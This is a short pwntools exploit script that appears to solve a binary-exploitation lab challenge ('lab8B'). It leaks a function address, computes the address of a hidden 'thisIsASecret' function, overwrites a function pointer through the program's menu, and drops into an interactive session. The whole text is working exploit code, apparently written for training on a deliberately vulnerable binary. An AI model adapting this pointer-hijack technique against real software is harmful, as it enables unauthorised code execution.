from pwn import *

r = process("/levels/lab08/lab8B")

# set data into v1
r.sendline("1")
r.sendline("1")
[r.sendline("1") for i in range(9)]

# Find address of thisIsASecret()
r.sendline("3")
r.sendline("1")
r.recvuntil("printFunc: ")
printVector = int(r.recvline(), 16)
thisIsASecret = printVector - 0x42

# Set data in v2
r.sendline("1")
r.sendline("2")
[r.sendline("1") for i in range(4)]
r.sendline(str(thisIsASecret - 1))
[r.sendline("1") for i in range(4)]

# Adding to fav until we hit our secret function
r.sendline("2")
[r.sendline("4") for i in range(5)]

# Loading our fav into v1
r.sendline("6")
r.sendline("4")
r.sendline("1")

# Calling thisIsASecret()
r.sendline("3")
r.sendline("1")

r.interactive()
